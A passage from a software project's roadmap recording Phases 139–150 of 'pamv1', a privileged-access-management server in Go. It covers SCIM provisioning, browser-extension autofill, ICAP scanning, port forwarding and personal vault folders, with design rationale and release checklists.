air-gap list), `cmd/pam-server/main.go` (`buildSAML`),
`internal/web/static/index.html` (sign-on link, effective-config line),
`go.mod` (`crewjam/saml`, `goxmldsig`, `etree`).

## Phase 150 — v0.38.0 ✅

Releases Phase 149 (SCIM 2.0 user provisioning) — a genuine minor: one new
capability. New migration `0041`.

- [x] **v0.38.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-16 as `ghcr.io/morandeirachema/pamv1:0.38.0` (also
  `latest`), digest
  `sha256:aa49b0d3a8b84475c77e40453e6131b7322ef4fc0f88c2c4b4addb0ee40d31ec`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.28.0 -> **0.29.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (the Tier-6 parity table row already landed in
  Phase 149's own PR — this pass covers every scattered version/phase-count
  mention, not just the hub lines)
- [x] `docs/README.md`'s currency line, `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row and ROADMAP.md's top-banner phase count all
  caught proactively
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 149 — SCIM 2.0 user provisioning ✅

**Closes:** StrongDM's SCIM server — push-based IdP user provisioning, vs.
pamv1's pull-only `POST /api/identity/reconcile` today. First phase of the
batch's back half (149–157).

**What shipped.** `/scim/v2/Users` (RFC 7643/7644), authenticated by a new
non-human `store.ScimKey` bearer identity — the same shape `AgentKey`/
`AppKey` already use, never an `auth.Principal`, so a SCIM client cannot
reach anything a human's own capability set would. Full CRUD: `POST`
(create), `GET` (single + `?filter=` + `?startIndex=&count=` paging),
`PUT` (replace), `PATCH` (partial update), `DELETE` — plus a static
`GET .../ServiceProviderConfig` for an IdP's own "test connection" step.

**The real design decision was `store.User` gaining two fields,** not the
REST surface itself: `ExternalID` (the IdP's own correlation key — a new
partial-unique-index column, `WHERE external_id <> ''`, so every existing
row sharing the empty default doesn't collide) and `Active` (SCIM's
deprovisioning switch). Making `Active` actually mean something is the
whole point of the phase: `auth.Resolver.Resolve()` now refuses a local
user token outright when `!u.Active`, fail-closed, the load-bearing
property proven end-to-end (`GET /api/me` with a real token, before and
after a real `PATCH .../active:false` call — not a store-layer assertion
alone). Directory/SSO logins are unaffected — they resolve through
`GetSessionByTokenHash`, never this row's `Active` flag.

**`CreateUser` ignores `Active` on the input struct entirely, deliberately,
at the store layer** — a bare Go `bool` cannot distinguish "the caller
wants an inactive user" from "the caller has never heard of this field,"
and the second case must never silently create a deactivated account. Both
`pgstore` and `memstore` hardcode active-on-create and let a caller who
genuinely needs otherwise (a SCIM `POST` whose own body says
`active:false`) make a separate `UpdateUserActive` call right after. This
is a stronger safety property than auditing every call site by hand: the
two production callers this phase found by grep (`internal/api/users.go`'s
human `createUser`, `internal/api/vendor_handlers.go`'s vendor-login
provisioning) needed **no changes at all** — and a future third call site
gets the same guarantee for free. **A quieter but real regression this
same design choice caught**: `internal/auth/auth_test.go`'s hand-rolled
`fakeDir` test double builds `store.User` fixtures directly (never through
`CreateUser`), so its existing fixtures — untouched since long before this
phase — started failing `Resolve()` the moment the `!u.Active` gate landed,
since their zero-value `Active` was now `false` by construction. Fixed by
adding `Active: true` to both fixture maps; a real near-miss the full test
suite caught immediately, not a store-layer contract test written to prove
the fix worked.

**DELETE is a deliberate divergence from `DELETE /api/users/{id}`.** The
human REST route stays exactly what it always was — a hard row delete.
SCIM's own `DELETE /scim/v2/Users/{id}` instead sets `Active=false`, the
same as `PATCH active:false`: SCIM's whole provisioning model is built
around being able to reactivate a deprovisioned identity later, which a
hard delete forecloses. Documented explicitly rather than silently changed,
since it means the two DELETE-shaped routes now do genuinely different
things to the same row.

**Role assignment is a fixed floor, not a field an IdP can set.** Every
SCIM-provisioned user gets `auth.RoleUser`, full stop — no role in the
request body is even read. `POST /api/users`'s own privilege-escalation
guard ("cannot assign a role... capabilities you do not hold") compares a
requested role against the *calling principal's* capabilities; a SCIM key
holds none, since it is not an `auth.Principal` at all, so there is no
caller capability set to bound a requested role against — a fixed,
least-privileged floor is the only safe universal choice.

**A SCIM-provisioned user's local access token is minted but never
returned via SCIM** — every `store.User` row needs one, but SCIM's core
schema has no field for a bearer secret, and the realistic expectation is
that a SCIM-provisioned identity authenticates through the same IdP doing
the provisioning (AD/Entra/OIDC), not a standalone pamv1 token. Documented,
not silently dropped.

**PATCH honors two real wire shapes**, not a hypothetical one: RFC 7644
§3.5.2's path-based form (`{"op":"replace","path":"active","value":false}`)
and Azure AD's documented no-path variant, where the changed attributes
arrive directly as an object in `value`
(`{"op":"Replace","value":{"active":false}}`) — a well-known, real SCIM
interop gotcha, proven by a dedicated test exercising both shapes against
the same deactivate/reactivate flow.

**The `filter` query parameter implements the one shape real IdPs actually
send** for an idempotent-provisioning existence check — `<attr> eq
"value"` against `userName` or `externalId` — not RFC 7644 §3.4.2.2's full
filter grammar. A filter matching nothing returns an empty `ListResponse`
(`totalResults:0`), not a 404 — the normal, successful shape a
"does-this-user-already-exist" check depends on.

**V1 scope:** `/Users` only — `/Groups` needs an entirely new store concept
(a named group + roster) with no existing backing, closer to its own phase
than an add-on to this one. Not interactively verified against a real IdP
(Okta/Azure AD/OneLogin) in this environment — no such account available —
so interop is proven against the documented wire shapes (including the
Azure AD PATCH quirk) and a hand-rolled fake, the same honesty this project
already applies to every external-IdP-requiring capability (see
EXTERNAL-INFRA-GAPS.md).

**Critical files:** `internal/store/store.go` (`User.ExternalID`/`Active`,
new `ScimKey`/`ScimStore`), `internal/store/pgstore/migrations/0041_scim.sql`,
`internal/auth/auth.go` (`Resolve`'s new fail-closed check), new
`internal/api/scim_handlers.go`, `internal/config/config.go`
(`PAM_SCIM_ENABLED`).

## Phase 148 — v0.37.0 ✅

Releases Phase 147 (browser-extension password autofill) — a genuine minor:
one new capability. No schema change.

- [x] **v0.37.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-16 as `ghcr.io/morandeirachema/pamv1:0.37.0` (also
  `latest`), digest
  `sha256:ec18cf8018f2d6f05cc2ba3aca085a16793d401f15c9471f0eff6a0d4647f464`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.27.0 -> **0.28.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (the Tier-6 parity table row already landed in
  Phase 147's own PR — this pass covers every scattered version/phase-count
  mention, not just the hub lines); caught one previously-uncaught stale
  phase-range mention in README.es.md's own top banner ("abarca de la 0 a
  la 141") that had drifted since around Phase 141/142 while the English
  README's equivalent line was already being kept current — fixed to 148
  in the same pass, not left for a future sweep to rediscover
- [x] `docs/README.md`'s currency line, `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row and ROADMAP.md's top-banner phase count all
  caught proactively
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 147 — Browser-extension password autofill ✅

Ninth phase of the BeyondTrust/Delinea/Teleport/StrongDM batch. Closes
Delinea's Web Password Filler / BeyondTrust's Workforce Passwords
equivalent — by reusing pamv1's own already-audited reveal path rather
than opening any new secrets-disclosure surface, honoring this project's
"secrets never leave as data... except via the audited reveal path"
invariant instead of working around it.

**A real Manifest V3 extension** (`extension/` — `manifest.json`,
`background.js`, `content.js`, `options.html`/`options.js`, its own
README), not a stub. It calls the *existing*
`POST /api/credentials/{id}/reveal` — the identical route and handler the
portal itself uses — with a new bearer-token shape minted specifically for
this purpose. **Not interactively verified against a real browser in this
environment** (no GUI browser available to load an unpacked extension in):
every JS file is syntax-checked (`node --check`) and `manifest.json`
JSON-validated, and the code closely follows well-established MV3
password-manager patterns (native-setter field writes so
framework-managed forms notice the fill, a debounced `MutationObserver`
for SPA login forms, `host_permissions: ["<all_urls>"]` since a password
filler has to work on any site the user visits) — but this is a real,
documented verification gap, not a "should be fine" hand-wave, catalogued
alongside RDP/guacd's own unverified-infrastructure precedent from
Phase 129.

**Design: a new session scope, narrower than TunnelOnly, not just another
copy of it.** `auth.SessionScopeExtension` resolves to a new
`Principal.ExtensionOnly bool` — but unlike `TunnelOnly` (RDP/VNC's
viewer-tunnel scope, a blanket refusal with **zero** exceptions anywhere
in the API middleware), an extension token needs exactly **one**
exception: the reveal route. Building that exception cleanly, without
duplicating `authz`'s ~40-line checklist (source-IP, device, posture,
`Can(cap)` — Phase 133's own gates, refactored once and shared everywhere
since), meant extracting the shared body into a new private `authzCore(cap,
allowExtension bool, next)`, with `authz` and a new `authzExtOK` as thin
wrappers over it. `authzExtOK` is wired at exactly one route,
`POST /api/credentials/{id}/reveal`; every other route keeps plain
`authz`, which now also blanket-refuses `ExtensionOnly` the same way it
already refuses `TunnelOnly`/`MFAPending`/`EnrollOnly` — and
`authenticated` (the capability-free sibling covering `/me`, `/logout`,
...) gained the identical refusal, since no route reachable through it is
the reveal endpoint either.

**The token inherits the minting user's own role and capabilities** —
deliberately, mirroring exactly how an RDP/VNC viewer token already works
(`issueSessionTTL`): `Can(auth.CapRevealSecret)` still runs normally at
the reveal route for an extension-scoped principal, so a user who could
never reveal a secret cannot mint a usable token in the first place
(`POST /api/extension-token` itself requires `CapRevealSecret`), and one
who could still goes through `revealCredential`'s own existing
`gateCredentialAccess` (grants ∪ safes, four-eyes approval) exactly as a
normal reveal does — nothing about being an extension token bypasses that.
The reveal audit detail gains a non-client-controlled `via:extension`
marker so the trail says which door a reveal came through, without a new
action name.

**`PAM_EXTENSION_TOKEN_TTL_HOURS`** (default 24, range 1–720) is
deliberately hours-to-days, not `rdpTokenTTL`'s 60 seconds: an RDP/VNC
token travels in a WebSocket URL and exists only for one connection's
setup, while an extension token lives in the browser's own local storage
and has to survive many page loads across a workday — but it is still a
bearer credential sitting on an endpoint, so it is not unbounded either.

**V1 scope**, matching the plan exactly: autofill only — read the vaulted
secret, fill a login form. No credential capture or write-back from the
browser (a materially different, riskier feature, not attempted here). No
automatic "which credential belongs to this site" discovery either: the
extension has no route that lists credentials, so a user manually maps
one hostname to one credential ID in Settings — a real, honest v1
limitation, not an oversight.

**Critical files:** `internal/auth/auth.go` (`SessionScopeExtension`,
`Principal.ExtensionOnly`), `internal/api/server.go` (`authzCore`,
`authzExtOK`, the `authenticated` refusal, the new route),
`internal/api/extension_handlers.go` (new — `extensionToken`),
`internal/api/credentials.go` (the `via:extension` audit marker),
`internal/config/config.go` (`PAM_EXTENSION_TOKEN_TTL_HOURS`), new
`internal/api/extension_test.go` (the load-bearing proof: a minted token
is refused on every route but reveal), new `extension/` directory.

## Phase 146 — v0.36.0 ✅

Releases Phase 145 (generic file-attachment secrets) — a genuine minor:
one new capability, plus the `ListCredentialsMeta` fix. No schema change.

- [x] **v0.36.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-16 as `ghcr.io/morandeirachema/pamv1:0.36.0` (also
  `latest`), digest
  `sha256:cc31cf8726ffd1fb7338f7ca7cd554de30be267e07b0e23b70c468ceb7449af3`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.26.0 -> **0.27.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (the Tier-6 parity table row already landed in
  Phase 145's own PR — this pass covers every scattered version/phase-count
  mention, not just the hub lines)
- [x] `docs/README.md`'s currency line, `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row and ROADMAP.md's top-banner phase count all
  caught proactively
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 145 — Generic file-attachment secrets ✅

Eighth phase of the BeyondTrust/Delinea/Teleport/StrongDM batch. Closes
Delinea's file-upload secret fields — license keys, cert bundles, short
documents — by adding `SecretTypeFile` alongside the existing
password/ssh_key/ssh_ca/db_zsp types. Mechanically it is nothing new:
`Credential.SecretEnc` is unbounded `TEXT` already, so a file's base64
content flows through the exact same `vault.Encrypt`/`Decrypt` pathway,
`POST /api/credentials`, and `POST /api/credentials/{id}/reveal` every
other secret type already uses — no new route, no migration (`secret_type`
is a plain `TEXT` column, not a `CHECK`-constrained enum). The one thing
that IS special-cased is size: `PAM_CREDENTIAL_FILE_MAX_KB` (default 1024,
capped at 10240, never "0 = unlimited" like the SFTP capture cap — a new
storage class starts bounded rather than opening unbounded and needing to
be dialed back later) refuses an over-cap file secret outright, before it
is ever encrypted or a row is ever inserted — the same hard-refuse-not-
truncate posture Phase 59's SFTP byte cap already established.

**A near-miss that the plan's own premise walked straight past, caught only
by the proxy test suite failing.** The plan's stated fix — folded in as
"newly relevant, not a nice-to-have" — was that `ListCredentials` and
`GetCredential` both select the full `secret_enc` for every row even though
it's `json:"-"` and never serialized, a cost that "gets materially worse
the moment attachments exist," and that `ListCredentials` should stop
selecting it. Implementing that literally — stripping `secret_enc` (and,
by the same reasoning, the equally unbounded `double_lock_verifier`/
`double_lock_enc`) from `ListCredentials`'s query — passed every test that
exists at the store layer alone, including a first-draft contract test
written to *prove* the stripping. It broke the PostgreSQL session proxy's
own JIT credential injection: `TestPostureGateProxy` and three
session-sharing tests failed with `credential decryption failed`, and one
paniced outright. The reason: `dbproxy.go`'s `lookupTargetCred` — a
function whose own doc comment already says "WITHOUT decrypting the
secret, so every authorization gate can run before any plaintext exists" —
deliberately calls `ListCredentials`, not `GetCredential`, specifically so
`SecretEnc` stays on the returned struct for a later, separate
`jitDecrypt` call once every gate has passed. A grep across the whole repo
(not just `internal/api`, where the plan's own file list pointed) found
sixteen real call sites; nine of them — `-rotate-kek`'s exhaustive re-wrap,
the credential lifecycle reconciler (both its scheduled and on-demand
paths), `findProvisioner` (db_zsp), the RDP/VNC viewer's JIT injection,
REST WinRM's JIT injection, and the broker's `ssh_exec`/`winrm_exec`
tools — list first and decrypt from the result exactly the same way, for
the exact same reason. Stripping the shared method would have silently
broken all nine in production while looking correct in every test that
didn't happen to exercise one of them end-to-end.

**Resolved by NOT changing `ListCredentials` at all, and adding a
genuinely separate `ListCredentialsMeta` instead** — the safer shape once
the real caller graph was known, not merely a differently-worded version
of the original plan. `ListCredentials` stays exactly as it always was,
full-fidelity, and its own doc comment on the `store.Store` interface now
names every caller that depends on that so the next person touching it
does not have to rediscover this the same way. `ListCredentialsMeta` is
the new, narrow, display-only sibling — same query shape the aborted
first draft used, wired only at the four call sites individually verified
to never touch `.SecretEnc`: the REST `GET /api/credentials` list
endpoint, the broker's own `list_credentials` tool (which already builds
its response from named fields only), `sshca_handlers.go`'s
username-existence check, and `targets.go`'s ZSP-credential check on
protocol change. `store.Store` grew by exactly one method (181 → 182,
`TestStoreMethodSetIsUnchanged` updated) rather than changing one's
contract.

**V1 scope.** `GetCredential` (singular) is untouched, a deliberate
scope decision after checking every one of its eight call sites
individually: every one already decrypts or dials with the result, so the
plan's parenthetical mention of a "GetCredential query fix" doesn't survive
contact with its actual callers — and the performance concern the plan
raised ("round-trips full ciphertext... materially worse the moment
attachments exist") is specifically about *list* calls scaling with
credential count, which a single-row `GetCredential` fetch never does
regardless of caller.

**Critical files:** `internal/store/store.go` (`SecretTypeFile`,
`ListCredentialsMeta`), `internal/store/pgstore/pgstore.go`
(`ListCredentialsMeta`, `scanCredentialMeta`), `internal/store/memstore/memstore.go`,
`internal/store/storetest/storetest.go` (contract tests for both methods,
proving the split rather than assuming it), `internal/store/methodset_test.go`,
`internal/api/credentials.go` (the cap check, `listCredentials`),
`internal/api/targets.go`, `internal/api/sshca_handlers.go`,
`internal/api/broker_tools.go`, `internal/config/config.go`
(`PAM_CREDENTIAL_FILE_MAX_KB`), new `internal/api/fileattachment_test.go`.

## Phase 144 — v0.35.0 ✅

Releases Phase 143 (ICAP-based file-transfer scanning) — a genuine minor:
one new capability. No schema change.

- [x] **v0.35.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-15 as `ghcr.io/morandeirachema/pamv1:0.35.0` (also
  `latest`), digest
  `sha256:6894ef8b51f188bca2597843c031983b760672ad8f85f4448d96b9eb9607aa31`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.25.0 -> **0.26.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (the Tier-6 parity table row already landed in
  Phase 143's own PR — this pass covers every scattered version/phase-count
  mention, not just the hub lines)
- [x] `docs/README.md`'s currency line, `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row and ROADMAP.md's top-banner phase count all
  caught proactively
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 143 — ICAP-based file-transfer scanning ✅

Seventh phase of the BeyondTrust/Delinea/Teleport/StrongDM batch. Closes
BeyondTrust's ICAP/DLP-AV integration for in-session file transfers, by
plugging onto the SFTP capture path Phase 32 already built.

**The plan's own premise didn't survive reading the code.** The plan text
claimed ICAP scanning could "fail closed exactly like the existing byte-cap
check" by hooking `finalizeLocked`. Reading `sftpcapture.go` in full first
disproved that: by the time finalization runs, an upload has already
reached the target (`gateWrite` forwards synchronously per-packet) and a
download has already reached the operator (`sftpRespWatcher.observe`
appends to `forward` *before* calling the capture-recording `handle()`).
Whole-object ICAP scanning needs a complete file, which only exists at
finalization — by which point the transfer, in either direction, is already
done. True pre-delivery blocking would mean buffering the whole file and
delaying delivery until scanned: a store-and-forward redesign the existing
per-packet relay architecture does not support. **v1 ships audit-only
detection, honestly, not prevention** —
`TestSFTPCaptureICAPScanFailedStillReachesTarget` is the concrete proof: an
unreachable ICAP server still lets the file land on the target, loudly
audited as `sftp.icap_scan_failed`, exactly as documented here rather than
discovered by an operator later.

**New `internal/icap` package: a minimal RFC 3507 client, RESPMOD only.**
One TCP connection per scan — dial, one request, one response, close — no
OPTIONS negotiation, no Preview, no keep-alive; all wire-valid omissions
against a real ICAP server (RFC 3507 §4.6 makes OPTIONS a SHOULD, not a
MUST) and unnecessary for a scan that isn't latency-sensitive the way the
per-packet relay it feeds is. Deliberately **no encapsulated req-hdr**: RFC
3507 doesn't require one for RESPMOD, and the alternative would mean
embedding an attacker-influenced SFTP remote path into a hand-built HTTP-
like header line — a CRLF-injection surface, traded here for a real but
minor v1 limitation (some AV gateways use a filename/extension heuristic in
addition to content scanning). A 204 response means clean; a 200 means
flagged, with the reason read from whichever of five widely-used vendor
threat headers is present (`X-Infection-Found`, `X-Virus-ID`,
`X-Violations-Found`, `X-Blocked-Reason`, `X-Attribute-Names` — none
standardized by RFC 3507, all in wide use); anything else, or a network
failure, is an error the caller must treat as "the scan didn't run," a
different fact from "the scan found nothing."

**Reused the byte cap already there instead of inventing a second one.**
Buffering a whole file in memory for scanning needs an explicit bound.
Rather than a new knob, `PAM_ICAP_URL` requires `PAM_SSH_SFTP_CAPTURE_MAX_MB`
to already be set (> 0) — the same cap that already bounds the disk
artifact now doubles as the in-memory scan buffer's ceiling, enforced at
config-load time, not discovered the first time a large transfer arrives.

**The ICAP round trip runs outside the capture lock, extending a pattern
already there for exactly this reason.** Both SFTP legs block on
`sftpCapture.mu` per packet; `sftpAuditRec`/`c.pending`/`flush()` already
existed to move slow audit-store writes outside it. This phase adds a
parallel `sftpScanRec`/`c.pendingScans`, queued by `finalizeLocked` and
drained by the same `flush()` after the lock is released — a synchronous
network call inside `finalizeLocked` itself would have stalled the whole
session on every file close.

**A capped or broken artifact is skipped, not scanned incomplete.**
Reporting a partial file as scanned-clean would be a false negative wearing
a real result's audit trail. New audit action `sftp.icap_skipped` names
which: `over-capture-limit` (the file hit `PAM_SSH_SFTP_CAPTURE_MAX_MB`) or
`incomplete-capture` (the artifact broke — a disk or sealer write failure).
A clean scan verdict is deliberately **not** audited per file — logging
"clean" for every single transferred file would dwarf the rest of a
session's audit trail for no operational gain; absence of a finding is the
clean report.

**Config wiring stayed inside the leaf-package boundary.**
`internal/config` imports no other `internal/` package — it is this
codebase's dependency root. Rather than importing `internal/icap` for a
better validation error, `PAM_ICAP_URL`'s shape (`icap://host[:port]/service`)
is re-validated with `net/url` alone; the strict parse `icap.NewClient`
itself performs runs again where the client is actually built
(`cmd/pam-server/main.go`), so a malformed URL still fails at startup, not
on the first file transfer. `PAM_ICAP_URL` was also added to
`airGapConflicts` (the Phase 133 precedent): `PAM_OT_AIRGAP` refuses to
start with an ICAP URL set unless it's named in `PAM_OT_AIRGAP_ALLOW`.

**V1 scope.** SFTP only — RDP clipboard file transfer is a smaller, separate
surface, noted as a natural follow-on rather than attempted here. No real
ICAP/AV appliance in CI or in this environment; proven against a fake wire-
level ICAP responder, the same pattern already used for the ITSM and
vendor-attestation webhooks. New audit actions `sftp.icap_flagged`,
`sftp.icap_scan_failed`, `sftp.icap_skipped`.

**Critical files:** new `internal/icap/icap.go` (client) and
`internal/icap/icap_test.go` (6 tests against a real fake ICAP responder),
`internal/proxy/sftpcapture.go` (`scanBuf`, `pendingScans`, `runScan`,
`skipReason`), `internal/proxy/proxy.go` (`Config.ICAPClient`),
`internal/proxy/sftp_icap_test.go` (4 end-to-end tests including the
scan-failed-still-reaches-target scope proof), `internal/config/config.go`
(`PAM_ICAP_URL`, validation, `airGapConflicts`), `cmd/pam-server/main.go`.

## Phase 142 — v0.34.0 ✅

Releases Phase 141 (raw TCP port-forwarding, same-target only) — a
genuine minor: one new capability. No schema change.

- [x] **v0.34.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-15 as `ghcr.io/morandeirachema/pamv1:0.34.0` (also
  `latest`), digest
  `sha256:ee9efe2090e84ae8bed9c1d07769babaad6024bf0a0189a093dfd88f052f5303`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.24.0 -> **0.25.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (the Tier-6 parity table row, and every
  scattered version/phase-count mention, not just the hub lines)
- [x] `docs/README.md`'s currency line, `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row and ROADMAP.md's top-banner phase count all
  caught proactively
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 141 — Raw TCP port-forwarding (same-target only) ✅

Sixth phase of the BeyondTrust/Delinea/Teleport/StrongDM batch. Closes
StrongDM's `ssh -L`-style forwarding — deliberately scoped, per the plan's
own "explicitly excluded" list, to the already-admitted target's own host:
forwarding reuses the connection's existing authorization rather than
inventing a new "allowed destinations" concept.

**The channel-accept loop, read before touching it.** pamv1's SSH proxy has
three near-identical `for nc := range chans` loops rejecting every channel
type but `session` (`handleConn`, `handleJoinConn`, `serveWinRM`). Only
`handleConn` has an `*ssh.Client` to the real target in scope — the other
two have no upstream SSH connection a forward could tunnel through, so
they keep rejecting `direct-tcpip` unchanged; this phase touches exactly
one of the three.

**The RFC 4254 §7.2 wire shape existed only for the *client* role.**
`jumpDial` already marshals `direct-tcpip` `ExtraData` when pamv1 dials a
target through a bastion, via `(*ssh.Client).Dial`'s own internals — but
nothing in production code had ever *decoded* it, because nothing had ever
accepted a client-initiated forward before. The only in-repo decoder was
`jump_test.go`'s fake bastion, and even that ignores the unmarshal error;
production code cannot.

**The real design question was never "parse the struct," it was "what
does 'same host' mean," and the plan text alone doesn't answer it.**
`target.Port` is the target's *SSH* port — restricting a forward's
destination port to it would make the feature pointless, since the whole
reason to forward is reaching a *different* service on the same box (a
database, an internal admin UI) that isn't SSH. So the restriction is
**same host, any port** — validated against `target.Host` exactly, plus
the loopback aliases (`localhost`/`127.0.0.1`/`::1`), because the forward
dials out through `upstream`, the connection already authenticated *as*
the target: resolved from there, `localhost` **is** the target, and
`ssh -L 5432:localhost:5432 op@target` — reaching a service bound only to
loopback on the target — is the single most common real-world shape of
this feature. A different host, even one on the same subnet, is refused
before the upstream is ever asked to dial it — closing what would
otherwise be an open SSRF pivot into the target's network, proven by a
test that confirms the decoy listener is never even reached.

**Three refusals nothing automatically covers, found by asking "what
inherits into a bare channel-loop branch" rather than assumed safe.** A
`direct-tcpip` channel is accepted at the loop level, not inside
`handleSession` — so it inherits none of that function's machinery.
Concretely: an **observer** (read-only, supervisor-watching) session's
read-only enforcement lives entirely inside `handleSession`'s
client→upstream request pump, which a raw forward never passes through —
left alone, observe mode would be a full bidirectional data path wearing
a read-only label. **`RequireSupervision`** has no supervision-wait
mechanism outside `handleSession` either, and forwarding cannot honestly
replicate "wait for a supervisor" without real, separate state-sharing
between two independent channels of the same connection — refused
outright instead. **`RequireRecording`** normally means "refuse if the
attempted recording fails," but a forward's bytes are opaque and were
never going to be recorded at all (no asciicast makes sense for arbitrary
binary protocols) — so for a forward specifically, "required" means
refused unconditionally, not attempted-then-checked.

**Auditability, honestly scoped, matching the plan.** Forwarded bytes are
opaque — no parser exists for arbitrary application data the way there is
for exec/SQL. New audit actions `forward.start`/`forward.end` (connection-
level: destination, byte counts each direction, duration) and
`forward.refused` (destination rejected, or a policy gate declined before
ever dialing).

**V1 scope.** `PAM_SSH_PORT_FORWARD` (default true, matching `PAM_SSH_SFTP`'s
default-allow posture — an operator already fully authorized for a target
loses nothing by also being able to forward to it) is a global on/off, not
a per-destination allowlist; no new capability, since a forward is just
another way of using a session the operator already opened. No IPv6
canonicalization beyond the literal `::1` alias — a target configured with
a non-canonical IPv6 form is an existing admin-input edge case, not new
here.

**Critical files:** `internal/proxy/proxy.go` (`handleConn`'s channel loop,
`handleDirectTCPIP`, `directTCPIPExtra`, `sameHostAsTarget`),
`internal/config/config.go` (`PAM_SSH_PORT_FORWARD`), `cmd/pam-server/main.go`,
new `internal/proxy/directtcpip_test.go` (6 tests against real upstream/backend
listeners, including the SSRF-refusal proof and all three policy-gate refusals).

## Phase 140 — v0.33.0 ✅

Releases Phase 139 (personal/private secret folders) — a genuine minor:
one new capability. Schema change (migration `0040`).

- [x] **v0.33.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-15 as `ghcr.io/morandeirachema/pamv1:0.33.0` (also
  `latest`), digest
  `sha256:be8cb9dbf061bd4e58dcf0435696622e19cf3dc5725d30b4a298e59ceea7453e`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.23.0 -> **0.24.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (the Tier-6 parity table row, and every
  scattered version/phase-count mention, not just the hub lines)
- [x] `docs/README.md`'s currency line and `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row (a documented recurring staleness point) both
  caught proactively; the top-banner "Phases 0–N are shipped" line caught
  in the same PR this time, not left for the next phase to find
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 139 — Personal/private secret folders ✅

Fifth phase of the BeyondTrust/Delinea/Teleport/StrongDM batch. Closes
Delinea's personal folders: secrets invisible even to admins by default,
with a named, narrow override role — the batch's first phase to change a
real, load-bearing access-control invariant rather than add a new gate
alongside the existing ones.

**The invariant it changes, read from the code, not assumed from the
plan.** `auth.CanConnectTarget` admitted **any admin unconditionally**,
before grants were even consulted — confirmed by reading it, not carried
over from the earlier research pass. A "personal" safe cannot mean
anything while that stands: every admin already bypassed every safe. Fix:
`Safe.Personal bool` (migration `0040`, additive, defaults false — every
existing safe is exactly as open to admins as it always was); when a
target's safe is personal, `CanConnectTarget`'s admin bypass is replaced
by a check for `CapUnlimitedVaultAccess`, a new capability deliberately
**not** in `roleCaps[RoleAdmin]` — only a custom profile that explicitly
lists it grants it. An admin who lacks it still falls through to ordinary
grant matching, so the safe's own owner (a member by construction)
connects normally regardless of role; only a *different* admin without the
override is turned away. Off a personal safe, behavior is byte-identical
to before this phase.

**A second, independent side door found while building, not in the
original plan text.** `canManageSafe` — the function deciding who may
add/remove a safe's members — let **any** `CapManageTargets` holder manage
**any** safe's roster, including one they'd just been denied by
`CanConnectTarget`. Left alone, the fix above is cosmetic: a target
manager simply adds themselves as a member of someone else's personal
safe and connects normally afterward. Closed the same way:
`CapManageTargets` alone is no longer sufficient for a *personal* safe's
membership — only an existing `can_manage` member of that safe, or
`CapUnlimitedVaultAccess`, may manage it.

**The bootstrap problem that finding created, and its fix.** Once
`CapManageTargets` stops being sufficient, a freshly created personal
safe with zero members would be permanently unmanageable — not even its
creator could ever add the first member. `createSafe` closes this by
requiring `owner` for a personal safe and seeding that user as its first
`can_manage` member in the same call (rolled back if the membership insert
fails), so a personal safe is never created in a dead-end state.

**Immutable after creation, enforced at the layer that actually matters.**
`Personal` is settable only by `CreateSafe`; `UpdateSafe` in both
`pgstore`/`memstore` never touches it (mirroring how `CreatedAt` is
already handled) regardless of what the caller's struct claims — so a
later rename or policy edit cannot silently un-personalize a safe, and the
guarantee lives in the store layer, not in handler code being careful.

**Loud audit, mirroring break-glass — REST paths only in v1, stated
plainly rather than dropped silently.** A new `safe.personal_override_used`
audit event fires whenever `CapUnlimitedVaultAccess` — not ordinary
membership — is what admitted a caller, wired into the two REST
chokepoints (`authorizedForTarget`, covering reveal/checkout/connect-REST;
`viewer_handlers.go`'s RDP/VNC token mint). The raw SSH/PostgreSQL/SQL
